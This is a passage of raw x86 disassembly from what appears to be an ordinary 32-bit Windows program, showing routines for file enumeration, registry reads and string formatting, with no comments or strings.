  40b1f6:	pop    esi
  40b1f7:	xor    ecx,ebp
  40b1f9:	pop    ebx
  40b1fa:	call   0x411980
  40b1ff:	mov    esp,ebp
  40b201:	pop    ebp
  40b202:	ret    0x10
  40b205:	int3   
  40b206:	int3   
  40b207:	int3   
  40b208:	int3   
  40b209:	int3   
  40b20a:	int3   
  40b20b:	int3   
  40b20c:	int3   
  40b20d:	int3   
  40b20e:	int3   
  40b20f:	int3   
  40b210:	mov    edi,edi
  40b212:	push   ebp
  40b213:	mov    ebp,esp
  40b215:	mov    eax,DWORD PTR [ebp+0xc]
  40b218:	sub    eax,0x10
  40b21b:	je     0x40b23b
  40b21d:	sub    eax,0x100
  40b222:	je     0x40b26b
  40b224:	sub    eax,0x1
  40b227:	je     0x40b22d
  40b229:	xor    eax,eax
  40b22b:	jmp    0x40b249
  40b22d:	movzx  eax,WORD PTR [ebp+0x10]
  40b231:	sub    eax,0x1
  40b234:	je     0x40b24d
  40b236:	sub    eax,0x1
  40b239:	jne    0x40b229
  40b23b:	push   0xffffffff
  40b23d:	push   DWORD PTR [ebp+0x8]
  40b240:	call   DWORD PTR ds:0x414158
  40b246:	xor    eax,eax
  40b248:	inc    eax
  40b249:	pop    ebp
  40b24a:	ret    0x10
  40b24d:	mov    eax,ds:0x413900
  40b252:	test   eax,eax
  40b254:	je     0x40b267
  40b256:	push   0xf
  40b258:	push   eax
  40b259:	push   0xd6
  40b25e:	push   DWORD PTR [ebp+0x8]
  40b261:	call   DWORD PTR ds:0x414174
  40b267:	push   0x1
  40b269:	jmp    0x40b23d
  40b26b:	mov    eax,DWORD PTR [ebp+0x14]
  40b26e:	mov    ds:0x413900,eax
  40b273:	jmp    0x40b229
  40b275:	int3   
  40b276:	int3   
  40b277:	int3   
  40b278:	int3   
  40b279:	int3   
  40b27a:	mov    edi,edi
  40b27c:	push   ebp
  40b27d:	mov    ebp,esp
  40b27f:	sub    esp,0x24
  40b282:	mov    eax,ds:0x413004
  40b287:	xor    eax,ebp
  40b289:	mov    DWORD PTR [ebp-0x4],eax
  40b28c:	push   ebx
  40b28d:	push   esi
  40b28e:	mov    ebx,edx
  40b290:	xor    esi,esi
  40b292:	mov    edx,ecx
  40b294:	push   edi
  40b295:	test   edx,edx
  40b297:	je     0x40b314
  40b299:	test   ebx,ebx
  40b29b:	je     0x40b314
  40b29d:	push   0x7
  40b29f:	pop    ecx
  40b2a0:	xor    eax,eax
  40b2a2:	mov    DWORD PTR [ebx],esi
  40b2a4:	mov    WORD PTR [ebp-0x24],ax
  40b2a8:	lea    edi,[ebp-0x22]
  40b2ab:	rep stos DWORD PTR es:[edi],eax
  40b2ad:	stos   WORD PTR es:[edi],ax
  40b2af:	lea    eax,[ebp-0x24]
  40b2b2:	push   eax
  40b2b3:	push   0x40b210
  40b2b8:	push   esi
  40b2b9:	push   0xd5
  40b2be:	push   edx
  40b2bf:	call   DWORD PTR ds:0x414164
  40b2c5:	cmp    eax,0xffffffff
  40b2c8:	je     0x40b2da
  40b2ca:	lea    eax,[ebp-0x24]
  40b2cd:	push   eax
  40b2ce:	call   DWORD PTR ds:0x414068
  40b2d4:	mov    edi,eax
  40b2d6:	test   edi,edi
  40b2d8:	jne    0x40b2df
  40b2da:	push   0xd
  40b2dc:	pop    esi
  40b2dd:	jmp    0x40b310
  40b2df:	lea    eax,[edi*2+0x2]
  40b2e6:	push   eax
  40b2e7:	call   DWORD PTR ds:0x4141b0
  40b2ed:	mov    DWORD PTR [ebx],eax
  40b2ef:	test   eax,eax
  40b2f1:	je     0x40b310
  40b2f3:	push   0x900
  40b2f8:	push   ecx
  40b2f9:	push   ecx
  40b2fa:	lea    ecx,[ebp-0x24]
  40b2fd:	push   ecx
  40b2fe:	lea    edx,[edi+0x1]
  40b301:	mov    ecx,eax
  40b303:	call   0x410ebe
  40b308:	mov    esi,eax
  40b30a:	and    esi,0xffff
  40b310:	mov    eax,esi
  40b312:	jmp    0x40b317
  40b314:	push   0x57
  40b316:	pop    eax
  40b317:	mov    ecx,DWORD PTR [ebp-0x4]
  40b31a:	pop    edi
  40b31b:	pop    esi
  40b31c:	xor    ecx,ebp
  40b31e:	pop    ebx
  40b31f:	call   0x411980
  40b324:	mov    esp,ebp
  40b326:	pop    ebp
  40b327:	ret    
  40b328:	int3   
  40b329:	int3   
  40b32a:	int3   
  40b32b:	int3   
  40b32c:	int3   
  40b32d:	mov    edi,edi
  40b32f:	push   ebp
  40b330:	mov    ebp,esp
  40b332:	push   ecx
  40b333:	push   ecx
  40b334:	push   ebx
  40b335:	push   esi
  40b336:	push   edi
  40b337:	mov    edi,edx
  40b339:	mov    ebx,ecx
  40b33b:	push   edi
  40b33c:	mov    esi,0x3f2
  40b341:	call   DWORD PTR ds:0x414068
  40b347:	cmp    eax,0x4
  40b34a:	jae    0x40b363
  40b34c:	push   0x4030c8
  40b351:	push   DWORD PTR ds:0x4130e8
  40b357:	call   0x40e818
  40b35c:	pop    ecx
  40b35d:	pop    ecx
  40b35e:	jmp    0x40b481
  40b363:	push   edi
  40b364:	call   DWORD PTR ds:0x414068
  40b36a:	cmp    eax,0xf
  40b36d:	jbe    0x40b376
  40b36f:	push   0x403128
  40b374:	jmp    0x40b351
  40b376:	lock inc DWORD PTR ds:0x4138f8
  40b37d:	cmp    DWORD PTR ds:0x4138f8,0x1
  40b384:	jg     0x40b397
  40b386:	and    DWORD PTR ds:0x4136b4,0x0
  40b38d:	call   0x411022
  40b392:	mov    ds:0x4138fc,eax
  40b397:	test   ebx,ebx
  40b399:	je     0x40b45a
  40b39f:	test   edi,edi
  40b3a1:	je     0x40b45a
  40b3a7:	and    DWORD PTR [ebp-0x8],0x0
  40b3ab:	push   ebx
  40b3ac:	call   DWORD PTR ds:0x4141b8
  40b3b2:	push   edi
  40b3b3:	mov    ebx,eax
  40b3b5:	call   DWORD PTR ds:0x4141b8
  40b3bb:	mov    edi,eax
  40b3bd:	test   ebx,ebx
  40b3bf:	je     0x40b437
  40b3c1:	test   edi,edi
  40b3c3:	je     0x40b437
  40b3c5:	and    DWORD PTR [ebp-0x4],0x0
  40b3c9:	push   ebx
  40b3ca:	call   DWORD PTR ds:0x414094
  40b3d0:	cmp    DWORD PTR ds:0x4136b4,0x0
  40b3d7:	jne    0x40b41b
  40b3d9:	cmp    DWORD PTR ds:0x4138fc,0x0
  40b3e0:	je     0x40b41b
  40b3e2:	push   ecx
  40b3e3:	push   DWORD PTR ds:0x4141bc
  40b3e9:	lea    ecx,[ebp-0x8]
  40b3ec:	push   DWORD PTR ds:0x4141b0
  40b3f2:	push   ecx
  40b3f3:	lea    ecx,[ebp-0x4]
  40b3f6:	push   ecx
  40b3f7:	push   eax
  40b3f8:	push   ebx
  40b3f9:	push   edi
  40b3fa:	call   0x411471
  40b3ff:	test   eax,eax
  40b401:	jne    0x40b41b
  40b403:	push   DWORD PTR [ebp-0x4]
  40b406:	call   DWORD PTR ds:0x4141a8
  40b40c:	mov    ecx,eax
  40b40e:	mov    eax,DWORD PTR [ebp+0x8]
  40b411:	mov    DWORD PTR [eax],ecx
  40b413:	test   ecx,ecx
  40b415:	je     0x40b437
  40b417:	xor    esi,esi
  40b419:	jmp    0x40b44c
  40b41b:	call   DWORD PTR ds:0x414074
  40b421:	push   eax
  40b422:	push   0x403188
  40b427:	push   DWORD PTR ds:0x4130e8
  40b42d:	call   0x40e818
  40b432:	add    esp,0xc
  40b435:	jmp    0x40b44c
  40b437:	push   0x8
  40b439:	pop    esi
  40b43a:	push   0x403200
  40b43f:	push   DWORD PTR ds:0x4130e8
  40b445:	call   0x40e818
  40b44a:	pop    ecx
  40b44b:	pop    ecx
  40b44c:	push   ebx
  40b44d:	call   DWORD PTR ds:0x4141bc
  40b453:	push   edi
  40b454:	call   DWORD PTR ds:0x4141bc
  40b45a:	or     eax,0xffffffff
  40b45d:	lock xadd DWORD PTR ds:0x4138f8,eax
  40b465:	dec    eax
  40b466:	test   eax,eax
  40b468:	jg     0x40b481
  40b46a:	mov    ecx,DWORD PTR ds:0x4138fc
  40b470:	test   ecx,ecx
  40b472:	je     0x40b481
  40b474:	push   ecx
  40b475:	call   0x41106e
  40b47a:	and    DWORD PTR ds:0x4138fc,0x0
  40b481:	pop    edi
  40b482:	mov    eax,esi
  40b484:	pop    esi
  40b485:	pop    ebx
  40b486:	mov    esp,ebp
  40b488:	pop    ebp
  40b489:	ret    0x4
  40b48c:	int3   
  40b48d:	int3   
  40b48e:	int3   
  40b48f:	int3   
  40b490:	int3   
  40b491:	mov    edi,edi
  40b493:	push   ebp
  40b494:	mov    ebp,esp
  40b496:	sub    esp,0x224
  40b49c:	mov    eax,ds:0x413004
  40b4a1:	xor    eax,ebp
  40b4a3:	mov    DWORD PTR [ebp-0x4],eax
  40b4a6:	push   ebx
  40b4a7:	mov    eax,ecx
  40b4a9:	xor    ebx,ebx
  40b4ab:	mov    DWORD PTR [ebp-0x220],eax
  40b4b1:	push   esi
  40b4b2:	push   edi
  40b4b3:	test   eax,eax
  40b4b5:	je     0x40b568
  40b4bb:	xor    ecx,ecx
  40b4bd:	cmp    cx,WORD PTR [eax]
  40b4c0:	je     0x40b568
  40b4c6:	push   0x4022b4
  40b4cb:	lea    ecx,[ebp-0x21c]
  40b4d1:	mov    DWORD PTR [ebp-0x21c],ebx
  40b4d7:	call   0x405ca6
  40b4dc:	mov    esi,DWORD PTR [ebp-0x21c]
  40b4e2:	test   eax,eax
  40b4e4:	je     0x40b55d
  40b4e6:	test   esi,esi
  40b4e8:	je     0x40b4fa
  40b4ea:	push   0x403264
  40b4ef:	push   esi
  40b4f0:	call   DWORD PTR ds:0x414048
  40b4f6:	mov    edi,eax
  40b4f8:	jmp    0x40b4fc
  40b4fa:	mov    edi,ebx
  40b4fc:	test   edi,edi
  40b4fe:	je     0x40b55d
  40b500:	push   0x20c
  40b505:	lea    eax,[ebp-0x214]
  40b50b:	push   ebx
  40b50c:	push   eax
  40b50d:	call   0x412060
  40b512:	add    esp,0xc
  40b515:	mov    DWORD PTR [ebp-0x218],0x210
  40b51f:	mov    edx,0x101
  40b524:	push   0x100
  40b529:	push   ecx
  40b52a:	push   ecx
  40b52b:	push   DWORD PTR [ebp-0x220]
  40b531:	lea    ecx,[ebp-0x20c]
  40b537:	call   0x410ebe
  40b53c:	push   0x1
  40b53e:	push   0x210
  40b543:	lea    eax,[ebp-0x218]
  40b549:	mov    ecx,edi
  40b54b:	push   eax
  40b54c:	push   ebx
  40b54d:	push   ebx
  40b54e:	call   DWORD PTR ds:0x414220
  40b554:	call   edi
  40b556:	xor    ebx,ebx
  40b558:	test   eax,eax
  40b55a:	setns  bl
  40b55d:	test   esi,esi
  40b55f:	je     0x40b568
  40b561:	push   esi
  40b562:	call   DWORD PTR ds:0x414120
  40b568:	mov    ecx,DWORD PTR [ebp-0x4]
  40b56b:	mov    eax,ebx
  40b56d:	pop    edi
  40b56e:	pop    esi
  40b56f:	xor    ecx,ebp
  40b571:	pop    ebx
  40b572:	call   0x411980
  40b577:	mov    esp,ebp
  40b579:	pop    ebp
  40b57a:	ret    
  40b57b:	int3   
  40b57c:	int3   
  40b57d:	int3   
  40b57e:	int3   
  40b57f:	int3   
  40b580:	mov    edi,edi
  40b582:	push   ebp
  40b583:	mov    ebp,esp
  40b585:	sub    esp,0x578
  40b58b:	mov    eax,ds:0x413004
  40b590:	xor    eax,ebp
  40b592:	mov    DWORD PTR [ebp-0x4],eax
  40b595:	mov    eax,DWORD PTR [ebp+0x8]
  40b598:	push   ebx
  40b599:	mov    ebx,edx
  40b59b:	mov    DWORD PTR [ebp-0x564],ecx
  40b5a1:	mov    ecx,DWORD PTR [ebp+0xc]
  40b5a4:	mov    DWORD PTR [ebp-0x574],eax
  40b5aa:	mov    DWORD PTR [ebp-0x56c],ecx
  40b5b0:	push   esi
  40b5b1:	push   edi
  40b5b2:	test   ebx,ebx
  40b5b4:	je     0x40b7ef
  40b5ba:	xor    edx,edx
  40b5bc:	cmp    dx,WORD PTR [ebx]
  40b5bf:	je     0x40b7ef
  40b5c5:	test   ecx,ecx
  40b5c7:	je     0x40b7ef
  40b5cd:	test   eax,eax
  40b5cf:	je     0x40b7ef
  40b5d5:	xor    ecx,ecx
  40b5d7:	cmp    cx,WORD PTR [eax]
  40b5da:	je     0x40b7ef
  40b5e0:	lea    ecx,[ebp-0x560]
  40b5e6:	xor    edi,edi
  40b5e8:	call   0x40fa55
  40b5ed:	mov    ecx,ebx
  40b5ef:	call   0x410767
  40b5f4:	test   eax,eax
  40b5f6:	je     0x40b7eb
  40b5fc:	push   ebx
  40b5fd:	push   ecx
  40b5fe:	call   0x408fed
  40b603:	mov    esi,eax
  40b605:	test   esi,esi
  40b607:	je     0x40b7e1
  40b60d:	xor    eax,eax
  40b60f:	cmp    ax,WORD PTR [esi]
  40b612:	je     0x40b7e1
  40b618:	lea    ecx,[ebp-0x560]
  40b61e:	call   0x40fade
  40b623:	test   eax,eax
  40b625:	je     0x40b67c
  40b627:	cmp    DWORD PTR [ebp+0x10],edi
  40b62a:	jne    0x40b66b
  40b62c:	push   0x209
  40b631:	lea    eax,[ebp-0x420]
  40b637:	push   eax
  40b638:	push   0xf0
  40b63d:	push   DWORD PTR [ebp-0x564]
  40b643:	call   DWORD PTR ds:0x414188
  40b649:	test   eax,eax
  40b64b:	je     0x40b66b
  40b64d:	push   0x34
  40b64f:	push   DWORD PTR [ebp-0x574]
  40b655:	lea    eax,[ebp-0x420]
  40b65b:	push   eax
  40b65c:	push   edi
  40b65d:	call   DWORD PTR ds:0x414168
  40b663:	cmp    eax,0x6
  40b666:	jne    0x40b66b
  40b668:	inc    edi
  40b669:	jmp    0x40b670
  40b66b:	mov    edi,0x80004004
  40b670:	push   esi
  40b671:	call   DWORD PTR ds:0x4141bc
  40b677:	jmp    0x40b7bc
  40b67c:	push   0x40327c
  40b681:	push   DWORD PTR ds:0x4130e8
  40b687:	call   0x40e818
  40b68c:	pop    ecx
  40b68d:	pop    ecx
  40b68e:	push   ebx
  40b68f:	push   0x0
  40b691:	push   0x402a68
  40b696:	push   0x401498
  40b69b:	call   DWORD PTR ds:0x414070
  40b6a1:	test   eax,eax
  40b6a3:	je     0x40b7b4
  40b6a9:	push   0x4032a8
  40b6ae:	push   DWORD PTR ds:0x4130e8
  40b6b4:	call   0x40e818
  40b6b9:	pop    ecx
  40b6ba:	pop    ecx
  40b6bb:	cmp    DWORD PTR [ebp+0x10],edi
  40b6be:	je     0x40b6d1
  40b6c0:	push   esi
  40b6c1:	call   DWORD PTR ds:0x4141bc
  40b6c7:	mov    edi,0x80004004
  40b6cc:	jmp    0x40b7bc
  40b6d1:	mov    ecx,DWORD PTR [ebp-0x564]
  40b6d7:	lea    edx,[ebp-0x568]
  40b6dd:	and    DWORD PTR [ebp-0x568],edi
  40b6e3:	call   0x40b27a
  40b6e8:	mov    DWORD PTR [ebp-0x570],eax
  40b6ee:	test   eax,eax
  40b6f0:	jne    0x40b73b
  40b6f2:	cmp    DWORD PTR [ebp-0x568],edi
  40b6f8:	je     0x40b73b
  40b6fa:	mov    edx,DWORD PTR [ebp-0x568]
  40b700:	lea    eax,[ebp-0x578]
  40b706:	and    DWORD PTR [ebp-0x578],edi
  40b70c:	mov    ecx,esi
  40b70e:	push   eax
  40b70f:	call   0x40b32d
  40b714:	mov    ecx,DWORD PTR [ebp-0x56c]
  40b71a:	mov    DWORD PTR [ebp-0x570],eax
  40b720:	test   eax,eax
  40b722:	jne    0x40b72e
  40b724:	mov    eax,DWORD PTR [ebp-0x578]
  40b72a:	mov    DWORD PTR [ecx],eax
  40b72c:	jmp    0x40b73b
  40b72e:	and    DWORD PTR [ecx],edi
  40b730:	mov    eax,0x3f2
  40b735:	mov    DWORD PTR [ebp-0x570],eax
  40b73b:	push   esi
  40b73c:	call   DWORD PTR ds:0x4141bc
  40b742:	push   DWORD PTR [ebp-0x568]
  40b748:	call   DWORD PTR ds:0x4141bc
  40b74e:	mov    eax,DWORD PTR [ebp-0x570]
  40b754:	test   eax,eax
  40b756:	je     0x40b7bc
  40b758:	push   0x209
  40b75d:	cmp    eax,0xd
  40b760:	je     0x40b77e
  40b762:	cmp    eax,0x3f2
  40b767:	lea    eax,[ebp-0x420]
  40b76d:	push   eax
  40b76e:	je     0x40b777
  40b770:	push   0xd3
  40b775:	jmp    0x40b78a
  40b777:	push   0xef
  40b77c:	jmp    0x40b78a
  40b77e:	lea    eax,[ebp-0x420]
  40b784:	push   eax
  40b785:	push   0xee
  40b78a:	push   DWORD PTR [ebp-0x564]
  40b790:	call   DWORD PTR ds:0x414188
  40b796:	push   0x30
  40b798:	push   DWORD PTR [ebp-0x574]
  40b79e:	lea    eax,[ebp-0x420]
  40b7a4:	push   eax
  40b7a5:	push   0x0
  40b7a7:	call   DWORD PTR ds:0x414168
  40b7ad:	mov    edi,0x80070005
  40b7b2:	jmp    0x40b7bc
  40b7b4:	mov    ecx,DWORD PTR [ebp-0x56c]
  40b7ba:	mov    DWORD PTR [ecx],esi
  40b7bc:	push   ebx
  40b7bd:	push   0x0
  40b7bf:	push   0x402a4c
  40b7c4:	mov    esi,0x401498
  40b7c9:	push   esi
  40b7ca:	call   DWORD PTR ds:0x41406c
  40b7d0:	push   ebx
  40b7d1:	push   0x0
  40b7d3:	push   0x402a68
  40b7d8:	push   esi
  40b7d9:	call   DWORD PTR ds:0x41406c
  40b7df:	jmp    0x40b7eb
  40b7e1:	push   esi
  40b7e2:	call   DWORD PTR ds:0x4141bc
  40b7e8:	xor    edi,edi
  40b7ea:	inc    edi
  40b7eb:	mov    eax,edi
  40b7ed:	jmp    0x40b7f4
  40b7ef:	mov    eax,0x80070057
  40b7f4:	mov    ecx,DWORD PTR [ebp-0x4]
  40b7f7:	pop    edi
  40b7f8:	pop    esi
  40b7f9:	xor    ecx,ebp
  40b7fb:	pop    ebx
  40b7fc:	call   0x411980
  40b801:	mov    esp,ebp
  40b803:	pop    ebp
  40b804:	ret    0xc
  40b807:	int3   
  40b808:	int3   
  40b809:	int3   
  40b80a:	int3   
  40b80b:	int3   
  40b80c:	mov    edi,edi
  40b80e:	push   ebp
  40b80f:	mov    ebp,esp
  40b811:	sub    esp,0x958
  40b817:	mov    eax,ds:0x413004
  40b81c:	xor    eax,ebp
  40b81e:	mov    DWORD PTR [ebp-0x8],eax
  40b821:	push   ebx
  40b822:	push   esi
  40b823:	push   edi
  40b824:	mov    edi,DWORD PTR [ebp+0x8]
  40b827:	xor    eax,eax
  40b829:	push   0x24c
  40b82e:	push   eax
  40b82f:	mov    DWORD PTR [ebp-0x950],eax
  40b835:	mov    esi,edx
  40b837:	mov    DWORD PTR [ebp-0x958],eax
  40b83d:	mov    ebx,ecx
  40b83f:	mov    DWORD PTR [ebp-0x94c],eax
  40b845:	lea    eax,[ebp-0x948]
  40b84b:	push   eax
  40b84c:	mov    DWORD PTR [ebp-0x954],esi
  40b852:	call   0x412060
  40b857:	add    esp,0xc
  40b85a:	xor    eax,eax
  40b85c:	push   esi
  40b85d:	push   ebx
  40b85e:	push   0x4032e0
  40b863:	push   0x900
  40b868:	push   eax
  40b869:	push   eax
  40b86a:	lea    eax,[ebp-0x6fc]
  40b870:	push   0x209
  40b875:	push   eax
  40b876:	call   0x410f98
  40b87b:	mov    esi,eax
  40b87d:	add    esp,0x20
  40b880:	test   esi,esi
  40b882:	js     0x40ba78
  40b888:	push   edi
  40b889:	push   0x2
  40b88b:	lea    eax,[ebp-0x950]
  40b891:	push   eax
  40b892:	push   0x401068
  40b897:	push   0x4010c0
  40b89c:	push   0x4010d8
  40b8a1:	call   DWORD PTR ds:0x414114
  40b8a7:	mov    ecx,0x4011bc
  40b8ac:	lea    eax,[ebp-0x950]
  40b8b2:	mov    dx,WORD PTR [eax]
  40b8b5:	cmp    dx,WORD PTR [ecx]
  40b8b8:	jne    0x40b8d8
  40b8ba:	test   dx,dx
  40b8bd:	je     0x40b8d4
  40b8bf:	mov    dx,WORD PTR [eax+0x2]
  40b8c3:	cmp    dx,WORD PTR [ecx+0x2]
  40b8c7:	jne    0x40b8d8
  40b8c9:	add    eax,0x4
  40b8cc:	add    ecx,0x4
  40b8cf:	test   dx,dx
  40b8d2:	jne    0x40b8b2
  40b8d4:	xor    eax,eax
  40b8d6:	jmp    0x40b8dd
  40b8d8:	sbb    eax,eax
  40b8da:	or     eax,0x1
  40b8dd:	test   eax,eax
  40b8df:	jne    0x40ba78
  40b8e5:	lea    eax,[ebp-0x94c]
  40b8eb:	push   eax
  40b8ec:	lea    eax,[ebp-0x6fc]
  40b8f2:	push   eax
  40b8f3:	call   DWORD PTR ds:0x414050
  40b8f9:	mov    edi,eax
  40b8fb:	cmp    edi,0xffffffff
  40b8fe:	jne    0x40b90a
  40b900:	mov    esi,0x80070006
  40b905:	jmp    0x40ba78
  40b90a:	test   BYTE PTR [ebp-0x94c],0x10
  40b911:	jne    0x40ba5b
  40b917:	lea    ecx,[ebp-0x920]
  40b91d:	lea    edx,[ecx+0x2]
  40b920:	mov    ax,WORD PTR [ecx]
  40b923:	add    ecx,0x2
  40b926:	cmp    ax,WORD PTR [ebp-0x958]
  40b92d:	jne    0x40b920
  40b92f:	sub    ecx,edx
  40b931:	lea    eax,[ebp-0x928]
  40b937:	sar    ecx,1
  40b939:	mov    edx,0x4032f0
  40b93e:	lea    eax,[eax+ecx*2]
  40b941:	mov    cx,WORD PTR [eax]
  40b944:	cmp    cx,WORD PTR [edx]
  40b947:	jne    0x40b969
  40b949:	test   cx,cx
  40b94c:	je     0x40b963
  40b94e:	mov    cx,WORD PTR [eax+0x2]
  40b952:	cmp    cx,WORD PTR [edx+0x2]
  40b956:	jne    0x40b969
  40b958:	add    eax,0x4
  40b95b:	add    edx,0x4
  40b95e:	test   cx,cx
  40b961:	jne    0x40b941
  40b963:	xor    ecx,ecx
  40b965:	mov    eax,ecx
  40b967:	jmp    0x40b970
  40b969:	sbb    eax,eax
  40b96b:	or     eax,0x1
  40b96e:	xor    ecx,ecx
  40b970:	test   eax,eax
  40b972:	jne    0x40ba5b
  40b978:	lea    eax,[ebp-0x920]
  40b97e:	push   eax
  40b97f:	push   DWORD PTR [ebp-0x954]
  40b985:	lea    eax,[ebp-0x6fc]
  40b98b:	push   ebx
  40b98c:	push   0x4032fc
  40b991:	push   0x900
  40b996:	push   ecx
  40b997:	push   ecx
  40b998:	push   0x209
  40b99d:	push   eax
  40b99e:	call   0x410f98
  40b9a3:	mov    esi,eax
  40b9a5:	add    esp,0x24
  40b9a8:	test   esi,esi
  40b9aa:	js     0x40ba78
  40b9b0:	xor    eax,eax
  40b9b2:	xor    esi,esi
  40b9b4:	push   0x2d0
  40b9b9:	mov    WORD PTR [ebp-0x2e4],ax
  40b9c0:	lea    eax,[ebp-0x2e2]
  40b9c6:	push   esi
  40b9c7:	push   eax
  40b9c8:	call   0x412060
  40b9cd:	add    esp,0xc
  40b9d0:	lea    eax,[ebp-0x6fc]
  40b9d6:	push   eax
  40b9d7:	push   0x403310
  40b9dc:	push   0x900
  40b9e1:	push   esi
  40b9e2:	push   esi
  40b9e3:	lea    eax,[ebp-0x2e4]
  40b9e9:	push   0x169
  40b9ee:	push   eax
  40b9ef:	call   0x410f98
  40b9f4:	mov    esi,eax
  40b9f6:	add    esp,0x1c
  40b9f9:	test   esi,esi
  40b9fb:	js     0x40ba78
  40b9fd:	mov    ecx,DWORD PTR ds:0x4136c0
  40ba03:	test   ecx,ecx
  40ba05:	je     0x40ba26
  40ba07:	xor    eax,eax
  40ba09:	mov    edx,0x40337c
  40ba0e:	push   eax
  40ba0f:	push   0x40
  40ba11:	push   0x401068
  40ba16:	lea    eax,[ebp-0x2e4]
  40ba1c:	push   eax
  40ba1d:	call   0x40ff87
  40ba22:	mov    esi,eax
  40ba24:	jmp    0x40ba57
  40ba26:	call   0x40916c
  40ba2b:	test   eax,eax
  40ba2d:	je     0x40ba73
  40ba2f:	mov    ecx,DWORD PTR ds:0x4136c0
  40ba35:	xor    eax,eax
  40ba37:	push   eax
  40ba38:	push   0x40
  40ba3a:	push   0x401068
  40ba3f:	lea    eax,[ebp-0x2e4]
  40ba45:	mov    edx,0x40337c
  40ba4a:	push   eax
  40ba4b:	call   0x40ff87
  40ba50:	mov    esi,eax
  40ba52:	call   0x40929a
  40ba57:	test   esi,esi
  40ba59:	js     0x40ba78
  40ba5b:	lea    eax,[ebp-0x94c]
  40ba61:	push   eax
  40ba62:	push   edi
  40ba63:	call   DWORD PTR ds:0x414080
  40ba69:	test   eax,eax
  40ba6b:	jne    0x40b90a
  40ba71:	jmp    0x40ba78
  40ba73:	mov    esi,0x80070005
  40ba78:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba7b:	mov    eax,esi
  40ba7d:	pop    edi
  40ba7e:	pop    esi
  40ba7f:	xor    ecx,ebp
  40ba81:	pop    ebx
  40ba82:	call   0x411980
  40ba87:	mov    esp,ebp
  40ba89:	pop    ebp
  40ba8a:	ret    0x4
  40ba8d:	int3   
  40ba8e:	int3   
  40ba8f:	int3   
  40ba90:	int3   
  40ba91:	int3   
  40ba92:	mov    edi,edi
  40ba94:	push   ebp
  40ba95:	mov    ebp,esp
  40ba97:	mov    eax,0x1e34
  40ba9c:	call   0x412030
  40baa1:	mov    eax,ds:0x413004
  40baa6:	xor    eax,ebp
  40baa8:	mov    DWORD PTR [ebp-0x4],eax
  40baab:	mov    eax,DWORD PTR [ebp+0x1c]
  40baae:	push   ebx
  40baaf:	push   esi
  40bab0:	mov    esi,edx
  40bab2:	mov    DWORD PTR [ebp-0x1e34],eax
  40bab8:	mov    ebx,ecx
  40baba:	mov    DWORD PTR [ebp-0x1e1c],esi
  40bac0:	push   edi
  40bac1:	lea    ecx,[ebp-0x15e0]
  40bac7:	call   0x40fa55
  40bacc:	xor    edi,edi
  40bace:	lea    ecx,[ebp-0x1e00]
  40bad4:	push   esi
  40bad5:	mov    DWORD PTR [ebp-0x1e10],edi
  40badb:	mov    DWORD PTR [ebp-0x1e28],edi
  40bae1:	mov    DWORD PTR [ebp-0x1e08],edi
  40bae7:	mov    DWORD PTR [ebp-0x1e14],edi
  40baed:	mov    DWORD PTR [ebp-0x1e18],edi
  40baf3:	call   0x40eb66
  40baf8:	lea    eax,[ebp-0x1bec]
  40bafe:	push   eax
  40baff:	lea    eax,[ebp-0x1bf6]
  40bb05:	push   eax
  40bb06:	push   0x401f98
  40bb0b:	push   0x900
  40bb10:	push   edi
  40bb11:	push   edi
  40bb12:	push   0x105
  40bb17:	push   0x4134a8
  40bb1c:	call   0x410f98
  40bb21:	mov    edi,eax
  40bb23:	add    esp,0x20
  40bb26:	test   edi,edi
  40bb28:	js     0x40c016
  40bb2e:	mov    edi,0x105
  40bb33:	lea    eax,[ebp-0xc60]
  40bb39:	push   edi
  40bb3a:	push   eax
  40bb3b:	push   0xd2
  40bb40:	push   ebx
  40bb41:	call   DWORD PTR ds:0x414188
  40bb47:	push   esi
  40bb48:	push   edi
  40bb49:	lea    eax,[ebp-0x218]
  40bb4f:	mov    edi,0x4010d8
  40bb54:	push   eax
  40bb55:	push   0x401068
  40bb5a:	push   0x402870
  40bb5f:	push   edi
  40bb60:	call   DWORD PTR ds:0x414114
  40bb66:	push   esi
  40bb67:	push   0x105
  40bb6c:	lea    eax,[ebp-0xa50]
  40bb72:	push   eax
  40bb73:	push   0x401068
  40bb78:	push   0x402888
  40bb7d:	push   edi
  40bb7e:	call   DWORD PTR ds:0x414114
  40bb84:	xor    eax,eax
  40bb86:	cmp    ax,WORD PTR [ebp-0x218]
  40bb8d:	je     0x40c011
  40bb93:	cmp    ax,WORD PTR [ebp-0xa50]
  40bb9a:	je     0x40c011
  40bba0:	push   esi
  40bba1:	xor    edi,edi
  40bba3:	push   edi
  40bba4:	push   0x4028bc
  40bba9:	push   0x4028a4
  40bbae:	call   DWORD PTR ds:0x414070
  40bbb4:	lea    ecx,[ebp-0x15e0]
  40bbba:	mov    edx,eax
  40bbbc:	call   0x40fb10
  40bbc1:	test   eax,eax
  40bbc3:	jne    0x40bbf8
  40bbc5:	cmp    edx,0x5
  40bbc8:	jb     0x40bbf8
  40bbca:	push   0x105
  40bbcf:	lea    eax,[ebp-0x840]
  40bbd5:	push   eax
  40bbd6:	push   0x12c
  40bbdb:	push   ebx
  40bbdc:	call   DWORD PTR ds:0x414188
  40bbe2:	push   0x10
  40bbe4:	lea    eax,[ebp-0x218]
  40bbea:	push   eax
  40bbeb:	lea    eax,[ebp-0x840]
  40bbf1:	push   eax
  40bbf2:	push   edi
  40bbf3:	jmp    0x40c00b
  40bbf8:	push   0xb
  40bbfa:	xor    edx,edx
  40bbfc:	pop    ecx
  40bbfd:	call   0x408f0a
  40bc02:	test   eax,eax
  40bc04:	jne    0x40bc17
  40bc06:	call   0x408fdb
  40bc0b:	test   eax,eax
  40bc0d:	jne    0x40bc17
  40bc0f:	mov    DWORD PTR [ebp-0x1e24],edi
  40bc15:	jmp    0x40bc88
  40bc17:	lea    eax,[ebp-0x1e08]
  40bc1d:	mov    DWORD PTR [ebp-0x1e24],0x1
  40bc27:	push   eax
  40bc28:	push   0x20019
  40bc2d:	push   edi
  40bc2e:	mov    eax,0x80000001
  40bc33:	push   0x4033c0
  40bc38:	push   eax
  40bc39:	mov    DWORD PTR [ebp-0x1e20],eax
  40bc3f:	call   DWORD PTR ds:0x414004
  40bc45:	test   eax,eax
  40bc47:	jne    0x40bc80
  40bc49:	lea    eax,[ebp-0x1e2c]
  40bc4f:	mov    DWORD PTR [ebp-0x1e2c],0x4
  40bc59:	push   eax
  40bc5a:	lea    eax,[ebp-0x1e24]
  40bc60:	push   eax
  40bc61:	push   edi
  40bc62:	push   edi
  40bc63:	push   0x40338c
